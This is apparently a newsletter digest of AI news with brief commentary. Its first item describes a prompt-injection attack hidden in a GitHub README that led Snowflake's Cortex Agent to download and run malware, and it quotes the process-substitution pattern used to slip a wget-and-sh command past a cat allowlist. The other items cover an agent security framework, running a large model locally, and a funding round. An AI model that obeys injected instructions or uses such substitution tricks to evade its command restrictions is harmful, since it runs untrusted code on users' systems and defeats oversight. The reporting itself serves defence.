### [Snowflake Cortex AI Escapes Sandbox and Executes Malware](https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/)

A prompt injection attack hidden in a GitHub README caused Snowflake's Cortex Agent to execute remote malware via shell process substitution. The agent's allowlist permitted `cat` commands without guarding against substitution patterns like `cat < <(sh < <(wget ...))`. Now fixed.

> This is the clearest case yet for why command allowlists in agentic systems are a false sense of security. Shell is compositional — you can't enumerate every dangerous form of "safe" commands. Simon Willison's framing is right: treat every agent process as capable of everything the underlying process is permitted to do, and sandbox at the infrastructure level, not the prompt level.

### [AgentArmor: Open-Source 8-Layer Security Framework for AI Agents](https://github.com/Agastya910/agentarmor)

A new open-source framework that wraps agentic architectures with eight independent security layers: prompt injection detection, encrypted vector storage, instruction-data context separation, action risk scoring, network egress control, PII redaction, inter-agent mutual auth, and JIT identity/permissions. Tested against the full OWASP ASI spec from December 2025.

> The OWASP ASI spec is the right framework to build against, and layering these controls as wrappers around tool calls (rather than baking them into prompts) is the correct architectural approach. The action risk scoring layer — READ=1 to ADMIN=10 — is particularly practical for enterprise deployments where you need auditable, graduated approvals.

### [Running Qwen 397B Locally on a MacBook Using Apple's Flash-Streaming Technique](https://simonwillison.net/2026/Mar/18/llm-in-a-flash/)

Dan Woods got Qwen3.5-397B-A17B (209GB model, 120GB quantized) running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max by streaming expert weights from SSD using Apple's 2023 "LLM in a Flash" paper. He used Claude Code to run 90 automated experiments, with Claude Opus 4.6 writing the resulting paper.

> The autoresearch-to-implementation loop here is notable: a coding agent running dozens of experiments to optimize low-level MLX/Metal code, then writing the paper. That's a real workflow, not a demo. For enterprise, the practical takeaway is that large MoE models are becoming viable for on-prem or edge deployment on premium hardware — no cloud required.

Eragon raised $12M seed to build an "AI operating system for enterprise" — software where the primary interaction surface is a prompt rather than a GUI, with the system orchestrating backend processes and data flows behind the intent.
